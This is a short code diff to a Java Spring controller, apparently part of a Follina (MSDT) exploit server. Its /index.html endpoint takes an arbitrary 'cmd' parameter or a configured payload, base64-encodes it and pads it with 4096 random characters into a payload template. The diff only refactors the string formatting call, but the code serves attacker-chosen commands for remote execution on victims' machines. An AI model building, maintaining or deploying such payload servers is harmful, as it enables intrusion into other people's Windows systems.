@@ -37,7 +37,7 @@ public class FollinaPayloadController {
   @GetMapping("/index.html")
   public String home(@RequestParam(required = false) String cmd) {
     String payload = StringUtils.hasText(cmd) ? cmd : follinaProperties.getPayload();
-    return PAYLOAD_TEMPLATE.formatted(encodeToBase64(payload), randomAlphabetic(4096));
+    return String.format(PAYLOAD_TEMPLATE, encodeToBase64(payload), randomAlphabetic(4096));
   }
 
   private static String encodeToBase64(String payload) {
